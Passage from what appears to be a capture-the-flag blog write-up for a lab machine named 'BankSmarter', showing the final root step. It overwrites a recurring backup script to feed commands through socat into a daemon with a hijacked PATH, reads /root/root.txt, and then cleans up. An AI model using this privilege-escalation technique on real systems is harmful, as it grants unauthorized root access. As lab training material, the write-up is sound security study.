+<img src="/images/banksmarter/root-identity-proof.png" alt="root identity proof" loading="lazy">
+
+<p>Score. A <code>root</code> prompt and <code>uid=0(root)</code>. PrivEsc = achieved.</p>
+
+<p>Let's find that root flag:</p>
+
+<pre><code>cat &gt; /home/layne.stanley/bankSmarter_backup.sh &lt;&lt;'EOF'
+#!/bin/bash
+{ printf '%s\n' 'PATH=/home/layne.stanley:$PATH /usr/local/bin/bank_backupd'; sleep 2; printf 'ls -la /root\n'; sleep 2; printf 'exit\n'; sleep 1; printf 'exit\n'; } | timeout 10s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock &gt; /home/layne.stanley/bank_root_listing.txt 2&gt;&amp;1
+EOF</code></pre>
+
+<p>Another 2-3 minutes later:</p>
+
+<pre><code>cat /home/layne.stanley/bank_root_listing.txt</code></pre>
+
+<img src="/images/banksmarter/root-directory-listing.png" alt="Root shell lists root.txt in the root directory" loading="lazy">
+
+<p>Thanks to the root shell, we can see the root flag.</p>
+
+<p>We'll modify the same command sequence, this time changing <code>ls -la /root</code> to <code>cat /root/root.txt</code>:</p>
+
+<pre><code>cat &gt; /home/layne.stanley/bankSmarter_backup.sh &lt;&lt;'EOF'
+#!/bin/bash
+{ printf '%s\n' 'PATH=/home/layne.stanley:$PATH /usr/local/bin/bank_backupd'; sleep 2; printf 'cat /root/root.txt\n'; sleep 2; printf 'exit\n'; sleep 1; printf 'exit\n'; } | timeout 10s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock &gt; /home/layne.stanley/bank_root_flag.txt 2&gt;&amp;1
+EOF</code></pre>
+
+<p>Wait, you guessed it, another 2-3 minutes:</p>
+
+<pre><code>cat /home/layne.stanley/bank_root_flag.txt</code></pre>
+
+<p>We nabbed the root flag.</p>
+
+<img src="/images/banksmarter/root-flag-redacted.png" alt="root flag redacted" loading="lazy">
+
+<h2>Cleanup</h2>
+
+<p>Now it's cleanup time. We start by stopping the first recurring probe:</p>
+
+<pre><code>cp /tmp/bankSmarter_backup.original /home/layne.stanley/bankSmarter_backup.sh
+rm /home/layne.stanley/python3</code></pre>
+
+<p>Eradicate the output files created in the home directory:</p>
+
+<pre><code>rm -f /home/layne.stanley/bank_{socket_identity,binary_strings,backupd_output,path_test,suid_probe,root_identity,root_listing,root_flag}.txt</code></pre>
+
+<p>And confirm the script is back to its previously-unaltered state:</p>
+
+<pre><code>head -n 3 /home/layne.stanley/bankSmarter_backup.sh</code></pre>
+
+<img src="/images/banksmarter/restored-backup-script.png" alt="restored backup script" loading="lazy">
+
+<p><code>#!/usr/bin/env bash</code> and <code># bank_maintenance.sh</code> = back to normal.</p>
+
+<p>Cue the confetti.</p>
+</div>
+<footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+<script>
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
+</script>
+<!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "d29793993e20413c866dbc989486b294"}'></script><!-- End Cloudflare Web Analytics -->
+</body>
+</html>
